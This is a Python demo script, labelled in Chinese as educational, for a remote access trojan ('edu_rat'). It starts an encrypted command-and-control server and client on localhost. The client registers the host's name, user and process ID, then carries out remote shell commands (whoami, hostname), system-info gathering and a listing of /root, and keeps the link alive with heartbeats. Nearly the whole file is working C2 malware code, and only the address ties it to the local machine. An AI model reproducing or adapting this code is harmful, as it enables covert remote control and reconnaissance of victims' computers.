"""
教育用途 - 干净版实时演示
"""
import os, sys, json, time, socket, subprocess, threading

sys.path.insert(0, '/root/edu_rat')
from crypto_utils import SymmetricCrypto, SecureChannel, MessageType
from config import config

KEY = config.crypto.derived_key
HOST, PORT = '127.0.0.1', 19555

def run_server():
    result = {}
    crypto = SymmetricCrypto(KEY)
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)
    s.settimeout(20)

    try:
        conn, addr = s.accept()
        ch = SecureChannel(crypto)

        # Step 1: Register
        data = conn.recv(4096)
        pkt = ch.unpack_message(data)
        info = json.loads(pkt.payload.decode())
        result['client'] = info.get('hostname', '?')
        print(f"[服务端] ✓ 客户端注册: {info['hostname']} (PID={info.get('pid')})")
        conn.sendall(ch.pack_message(MessageType.ACK, b'OK'))

        time.sleep(0.5)

        # Step 2: whoami
        print(f"\n[服务端] >>> 下发命令: whoami")
        cmd = ch.pack_message(MessageType.COMMAND,
            json.dumps({'command_id':'1','name':'shell','args':{'command':'whoami'}}).encode())
        conn.sendall(cmd)
        data = conn.recv(4096)
        pkt = ch.unpack_message(data)
        r = json.loads(pkt.payload.decode())
        output = r['output'].strip()
        print(f"[服务端] <<< 执行结果: {output}")

        time.sleep(0.3)

        # Step 3: hostname
        print(f"\n[服务端] >>> 下发命令: hostname")
        cmd = ch.pack_message(MessageType.COMMAND,
            json.dumps({'command_id':'2','name':'shell','args':{'command':'hostname'}}).encode())
        conn.sendall(cmd)
        data = conn.recv(4096)
        pkt = ch.unpack_message(data)
        r = json.loads(pkt.payload.decode())
        print(f"[服务端] <<< 执行结果: {r['output'].strip()}")

        time.sleep(0.3)

        # Step 4: sysinfo
        print(f"\n[服务端] >>> 下发命令: sysinfo")
        cmd = ch.pack_message(MessageType.COMMAND,
            json.dumps({'command_id':'3','name':'sysinfo','args':{}}).encode())
        conn.sendall(cmd)
        data = conn.recv(8192)
        pkt = ch.unpack_message(data)
        r = json.loads(pkt.payload.decode())
        si = json.loads(r['output'])
        for k in ['hostname','platform','architecture','username','python_version','pid']:
            v = si.get(k, si.get(k.replace('platform','os'),'?'))
            print(f"[服务端]   {k}: {v}")

        time.sleep(0.3)

        # Step 5: ls
        print(f"\n[服务端] >>> 下发命令: ls /root")
        cmd = ch.pack_message(MessageType.COMMAND,
            json.dumps({'command_id':'4','name':'ls','args':{'path':'/root'}}).encode())
        conn.sendall(cmd)
        data = conn.recv(8192)
        pkt = ch.unpack_message(data)
        r = json.loads(pkt.payload.decode())
        ls_r = json.loads(r['output'])
        print(f"[服务端] <<< 目录 {ls_r['path']}: {ls_r['count']} 个条目")
        for e in ls_r.get('entries', [])[:5]:
            print(f"[服务端]    [{e['type']}] {e['name']:30s} {e['size']:>8d}")

        # Step 6: Heartbeat
        data = conn.recv(4096)
        pkt = ch.unpack_message(data)
        if pkt and pkt.msg_type == MessageType.HEARTBEAT:
            print(f"\n[服务端] ✓ 收到心跳包 (连接保活)")
            conn.sendall(ch.pack_message(MessageType.ACK, b'PONG'))

        print(f"\n{'='*60}")
        print(f"  演示完成！C2 通信链路正常工作。")
        print(f"{'='*60}")

        conn.close()
    except socket.timeout:
        print("[服务端] 超时")
    finally:
        s.close()

def run_client():
    time.sleep(0.3)
    from commands import CommandDispatcher, CommandResult
    crypto = SymmetricCrypto(KEY)
    dispatcher = CommandDispatcher()

    for attempt in range(10):
        try:
            sock = socket.socket()
            sock.connect((HOST, PORT))
            break
        except ConnectionRefusedError:
            time.sleep(0.3)

    ch = SecureChannel(crypto)

    # Register
    info = {
        'client_id': f'demo-{os.getpid()}',
        'hostname': socket.gethostname(),
        'os': sys.platform,
        'username': os.environ.get('USER', '?'),
        'pid': os.getpid(),
    }
    sock.sendall(ch.pack_message(MessageType.REGISTER, json.dumps(info).encode()))
    data = sock.recv(4096)
    ch.unpack_message(data)
    print(f"[客户端] ✓ 注册成功, 等待命令...")

    # Main loop
    last_hb = 0
    sock.settimeout(1)
    while True:
        try:
            data = sock.recv(8192)
            if not data: break
            pkt = ch.unpack_message(data)
            if pkt is None: continue
            if pkt.msg_type == MessageType.ACK: continue
            if pkt.msg_type == MessageType.COMMAND:
                cmd = json.loads(pkt.payload.decode())
                result = dispatcher.execute(cmd['command_id'], cmd['name'], cmd.get('args', {}))
                sock.sendall(ch.pack_message(MessageType.RESPONSE, result.to_json()))
                print(f"[客户端] 执行命令: {cmd['name']} → {'OK' if result.success else 'FAIL'} ({result.duration_ms:.0f}ms)")
        except socket.timeout:
            if time.time() - last_hb > 5:
                sock.sendall(ch.pack_message(MessageType.HEARTBEAT, b''))
                last_hb = time.time()
        except Exception:
            break
    sock.close()

# Run
print("""
╔══════════════════════════════════════════════════════════════╗
║   教育用途远程管理框架 - 实时演示                            ║
║   C2 通信流程: 注册 → 命令下发 → 执行 → 结果回传           ║
╚══════════════════════════════════════════════════════════════╝
""")
server = threading.Thread(target=run_server)
server.start()
run_client()
server.join(timeout=5)
